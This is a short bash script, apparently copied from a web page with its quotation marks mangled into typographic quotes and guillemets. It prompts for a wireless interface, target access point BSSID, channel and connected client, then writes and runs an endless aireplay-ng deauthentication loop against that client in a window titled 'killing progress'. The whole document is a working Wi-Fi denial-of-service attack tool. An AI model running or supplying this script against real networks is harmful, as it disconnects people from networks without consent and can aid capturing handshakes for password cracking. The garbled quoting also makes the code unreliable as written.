echo -n -e ‘\E[37;41m'»Enter Interface: «; tput sgr0
read int
echo ‘—>’
echo -n -e ‘\E[37;41m'»Enter Target AP Bssid: «; tput sgr0
read bsid
echo ‘—>’
echo -n -e ‘\E[37;41m'»Enter Target AP channel: «; tput sgr0
read chn
iwconfig $int channel $chn
echo ‘—>’
echo -n -e ‘\E[37;41m'»Enter Target Connected Client: «; tput sgr0
read cli
echo ‘—>’

rm /home/cut.sh &>/dev/null;
echo »’for (( ; ; ))
do
  aireplay-ng -a ‘$bsid’ -c ‘$cli’ -0 100 ‘$int’
 
done
»’ >> /home/cut.sh
xterm -geometry 70×12-1-1 -T «killing progress» -bg red -e «sh /home/cut.sh» 